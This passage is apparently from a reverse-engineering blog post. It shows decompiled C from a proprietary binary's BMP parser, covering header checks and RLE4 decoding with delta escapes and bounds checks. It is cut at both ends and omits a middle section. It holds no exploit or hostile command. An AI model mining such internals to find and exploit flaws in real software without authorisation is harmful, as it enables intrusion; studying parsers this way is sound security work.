class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __thiscall <span class="title function_">sub_20D4B4AF</span><span class="params">(_DWORD *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v9; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">double</span> v21; <span class="comment">// xmm1_8</span></span><br><span class="line">  <span class="type">double</span> v22; <span class="comment">// xmm4_8</span></span><br><span class="line">  __int16 v23; <span class="comment">// cx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> height; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v26; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v37; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v38; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v40; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v41; <span class="comment">// ah</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v42; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v44; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v46; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v47; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v48; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v50; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v51; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v52; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v53; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v54; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> xpos; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v56; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v57; <span class="comment">// ah</span></span><br><span class="line">  <span class="type">int</span> v58; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v59; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v60; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v61; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v62; <span class="comment">// si</span></span><br><span class="line">  <span class="type">int</span> v63; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v64; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v65; <span class="comment">// esi</span></span><br><span class="line">  _DWORD *v66; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v67; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> v68; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v69; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">bool</span> v70; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">int</span> v71; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v72; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v73; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v74; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> ypos_1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> dst_xpos; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> xpos_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> index; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> byte_slot; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> odd_index; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v81; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 _4bits; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> line; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 _4bits_1; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v85; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v86; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v87; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v88; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v89; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v90; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v91; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v92; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v93; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v94; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v95; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v96; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v97; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v98; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v99; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v100; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v101; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v102; <span class="comment">// [esp-4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v103; <span class="comment">// [esp-4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">int</span> v104; <span class="comment">// [esp-4h] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> v105; <span class="comment">// [esp+10h] [ebp-68h]</span></span><br><span class="line">  <span class="type">void</span> **v106; <span class="comment">// [esp+2Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v107; <span class="comment">// [esp+34h] [ebp-44h]</span></span><br><span class="line">  <span class="type">int</span> v108; <span class="comment">// [esp+38h] [ebp-40h]</span></span><br><span class="line">  <span class="type">int</span> v109; <span class="comment">// [esp+3Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> v110; <span class="comment">// [esp+44h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> width_1; <span class="comment">// [esp+48h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v112; <span class="comment">// [esp+4Ch] [ebp-2Ch]</span></span><br><span class="line">  __int16 v113; <span class="comment">// [esp+50h] [ebp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 bit_count; <span class="comment">// [esp+52h] [ebp-26h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> biCompression; <span class="comment">// [esp+54h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v116; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v117; <span class="comment">// [esp+60h] [ebp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v118; <span class="comment">// [esp+64h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v119; <span class="comment">// [esp+74h] [ebp-4h]</span></span><br><span class="line">  <span class="type">char</span> v120; <span class="comment">// [esp+78h] [ebp+0h]</span></span><br><span class="line">  <span class="type">void</span> **v121; <span class="comment">// [esp+7Ch] [ebp+4h]</span></span><br><span class="line">  <span class="type">int</span> v122; <span class="comment">// [esp+84h] [ebp+Ch]</span></span><br><span class="line">  <span class="type">int</span> v123; <span class="comment">// [esp+88h] [ebp+10h]</span></span><br><span class="line">  <span class="type">int</span> v124; <span class="comment">// [esp+8Ch] [ebp+14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v125; <span class="comment">// [esp+94h] [ebp+1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 xdelta; <span class="comment">// [esp+9Bh] [ebp+23h]</span></span><br><span class="line">  <span class="type">int</span> cmd; <span class="comment">// [esp+9Ch] [ebp+24h]</span></span><br><span class="line">  <span class="type">char</span> v128; <span class="comment">// [esp+A3h] [ebp+2Bh]</span></span><br><span class="line">  <span class="type">int</span> v129; <span class="comment">// [esp+A4h] [ebp+2Ch]</span></span><br><span class="line">  __int16 ydelta; <span class="comment">// [esp+A8h] [ebp+30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> width; <span class="comment">// [esp+ACh] [ebp+34h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v132; <span class="comment">// [esp+B3h] [ebp+3Bh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bitmap_ends; <span class="comment">// [esp+B4h] [ebp+3Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v134; <span class="comment">// [esp+B8h] [ebp+40h]</span></span><br><span class="line">  <span class="type">char</span> v135; <span class="comment">// [esp+BFh] [ebp+47h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v136; <span class="comment">// [esp+C0h] [ebp+48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 low_4bits; <span class="comment">// [esp+C6h] [ebp+4Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 high_4bits; <span class="comment">// [esp+C7h] [ebp+4Fh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ypos; <span class="comment">// [esp+C8h] [ebp+50h]</span></span><br><span class="line">  <span class="type">char</span> v140; <span class="comment">// [esp+CCh] [ebp+54h]</span></span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  <span class="keyword">if</span> ( !this[<span class="number">2</span>] )</span><br><span class="line">    _Mtx_lock_2(<span class="number">16479</span>);</span><br><span class="line">  fn_read_bytes(&amp;v140, <span class="number">14</span>);</span><br><span class="line">  sub_20D4AFFB(&amp;v110);</span><br><span class="line">  v2 = v1[<span class="number">2</span>];</span><br><span class="line">  fn_read_bytes(&amp;v110, <span class="number">40</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v113 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">  width = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bit_count == <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  <span class="keyword">if</span> ( bit_count == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !biCompression )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    v3 = biCompression == <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( bit_count != <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( bit_count != <span class="number">24</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">      sub_20E0D4B3(&amp;v120, <span class="number">17996</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_176;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">    v3 = biCompression == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !biCompression )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  v3 = biCompression == <span class="number">1</span>;</span><br><span class="line">LABEL_10:</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">LABEL_11:</span><br><span class="line">  v4 = bit_count * width_1;</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> || v4 &lt; width_1 || v4 &lt; bit_count )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_20E0D4B3(&amp;v120, <span class="number">16479</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_176;</span><br><span class="line">  &#125;</span><br><span class="line">..................................................................</span><br><span class="line">    <span class="keyword">if</span> ( biCompression == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v54 = v1[<span class="number">2</span>];</span><br><span class="line">      xpos = <span class="number">0</span>;</span><br><span class="line">      ypos = v112 - <span class="number">1</span>;</span><br><span class="line">      bitmap_ends = <span class="number">0</span>;</span><br><span class="line">      v136 = <span class="number">0</span>;</span><br><span class="line">      result = fn_feof(v54, v10);</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          v56 = v1[<span class="number">2</span>];</span><br><span class="line">          fn_read_bytes(&amp;cmd, <span class="number">2</span>);</span><br><span class="line">          v57 = BYTE1(cmd);</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v58 = BYTE1(cmd);</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v74 = <span class="number">1</span>;</span><br><span class="line">              bitmap_ends = <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_152;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( BYTE1(cmd) != <span class="number">2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v59 = ypos;</span><br><span class="line">              v60 = BYTE1(cmd) + xpos;</span><br><span class="line">              <span class="keyword">if</span> ( ypos &gt;= height )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">              v61 = v136;</span><br><span class="line">              <span class="keyword">if</span> ( v60 &lt; v136 || v60 &lt; BYTE1(cmd) || v60 &gt; width )</span><br><span class="line">                <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">              v62 = <span class="number">0</span>;</span><br><span class="line">              v134 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v63 = v62 &amp; <span class="number">1</span>;</span><br><span class="line">                  v125 = v62 &amp; <span class="number">1</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( !(v62 &amp; <span class="number">1</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    v64 = v1[<span class="number">2</span>];</span><br><span class="line">                    fn_read_bytes(&amp;v132, <span class="number">1</span>);</span><br><span class="line">                    v128 = v132 &amp; <span class="number">0xF</span>;</span><br><span class="line">                    v59 = ypos;</span><br><span class="line">                    v135 = v132 &gt;&gt; <span class="number">4</span>;</span><br><span class="line">                    v63 = v125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v65 = v61 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">                  v104 = v59;</span><br><span class="line">                  v66 = (_DWORD *)v1[<span class="number">3</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( v61 &amp; <span class="number">1</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( v63 )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v68 = fn_get_scanline(v66, v104);</span><br><span class="line">                      v69 = v128;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      v68 = fn_get_scanline(v66, v104);</span><br><span class="line">                      v69 = v135;</span><br><span class="line">                    &#125;</span><br><span class="line">                    *(_BYTE *)(v65 + v68) |= v69;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v67 = v135;</span><br><span class="line">                    <span class="keyword">if</span> ( v63 )</span><br><span class="line">                      v67 = v128;</span><br><span class="line">                    *(_BYTE *)(fn_get_scanline(v66, v104) + v65) = <span class="number">16</span> * v67;</span><br><span class="line">                    v61 = v136;</span><br><span class="line">                  &#125;</span><br><span class="line">                  ++v61;</span><br><span class="line">                  v57 = BYTE1(cmd);</span><br><span class="line">                  v62 = v134 + <span class="number">1</span>;</span><br><span class="line">                  v70 = v134 + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">                  v136 = v61;</span><br><span class="line">                  v59 = ypos;</span><br><span class="line">                  ++v134;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> ( v70 );</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( (v57 &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v71 = v1[<span class="number">2</span>];</span><br><span class="line">                fn_read_bytes(&amp;v132, <span class="number">1</span>);</span><br><span class="line">              &#125;</span><br><span class="line">LABEL_150:</span><br><span class="line">              xpos = v136;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_151;</span><br><span class="line">            &#125;</span><br><span class="line">            v72 = v1[<span class="number">2</span>];</span><br><span class="line">            fn_read_bytes(&amp;xdelta, <span class="number">1</span>);</span><br><span class="line">            v73 = v1[<span class="number">2</span>];</span><br><span class="line">            fn_read_bytes((<span class="type">char</span> *)&amp;ydelta + <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">            xpos += xdelta;</span><br><span class="line">            ypos -= HIBYTE(ydelta);</span><br><span class="line">            v136 = xpos;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            --ypos;</span><br><span class="line">            xpos = <span class="number">0</span>;</span><br><span class="line">            v136 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_151:</span><br><span class="line">          v74 = bitmap_ends;</span><br><span class="line">LABEL_152:</span><br><span class="line">          result = fn_feof(v1[<span class="number">2</span>], v58);</span><br><span class="line">          <span class="keyword">if</span> ( result )</span><br><span class="line">          &#123;</span><br><span class="line">            v53 = v74 == <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_106;</span><br><span class="line">          &#125;</span><br><span class="line">          height = v129;</span><br><span class="line">        &#125;</span><br><span class="line">        v58 = (<span class="type">unsigned</span> __int8)cmd;</span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">        ypos_1 = ypos;</span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;</span><br><span class="line">        dst_xpos = (<span class="type">unsigned</span> __int8)cmd + xpos;</span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)dst_xpos &gt; (<span class="type">signed</span> <span class="type">int</span>)width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">        xpos_ = v136;</span><br><span class="line">        <span class="keyword">if</span> ( dst_xpos &lt; v136 || dst_xpos &lt; (<span class="type">unsigned</span> __int8)cmd )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_175;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        v134 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            v81 = (_DWORD *)v1[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index )</span><br><span class="line">              &#123;</span><br><span class="line">                line = fn_get_scanline(v81, ypos_1);</span><br><span class="line">                _4bits_1 = low_4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line = fn_get_scanline(v81, ypos_1);</span><br><span class="line">                _4bits_1 = high_4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              *(_BYTE *)(byte_slot + line) |= _4bits_1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              _4bits = high_4bits;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index )</span><br><span class="line">                _4bits = low_4bits;</span><br><span class="line">              *(_BYTE *)(fn_get_scanline(v81, ypos_1) + byte_slot) = <span class="number">16</span> * _4bits;</span><br><span class="line">              xpos_ = v136;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = v134 + <span class="number">1</span>;</span><br><span class="line">            v70 = v134 + <span class="number">1</span> &lt; (<span class="type">unsigned</span> __int8)cmd;</span><br><span class="line">            v136 = xpos_;</span><br><span class="line">            ypos_1 = ypos;</span><br><span class="line">            ++v134;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( v70 );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_150;</span><br><span 